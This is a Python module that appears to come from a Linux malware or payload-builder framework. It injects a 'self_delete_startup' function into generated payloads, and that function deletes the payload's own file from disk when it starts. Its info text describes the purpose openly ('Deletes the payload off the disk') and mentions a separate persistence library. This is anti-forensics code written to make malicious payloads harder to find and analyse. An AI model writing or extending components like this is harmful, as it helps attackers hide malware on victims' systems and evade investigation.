# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify

def main(option):
    if option == 'generate':
        config.import_statements.append('import os')
        config.import_statements.append('import sys')
        config.startup_end.append('self_delete_startup()')
        config.functions.append('''
def self_delete_startup():
    os.remove(os.path.abspath(sys.argv[0]))
''')
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Self deleter startup component",
                "OS": "Linux",
                "Required Modules": "os, sys",
                "Commands": "NIL (Runs at startup)",
                "Description": "Deletes the payload off the disk"
            }
        elif interface == "CUI":
            print('\nName             : Self deleter startup component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : os, sys' \
                  '\nCommands         : NIL (Runs at startup)' \
                  '\nDescription      : Deletes the payload off the disk' \
                  '\nNote             : Persistence library will NOT work due to the file being deleted off of disk')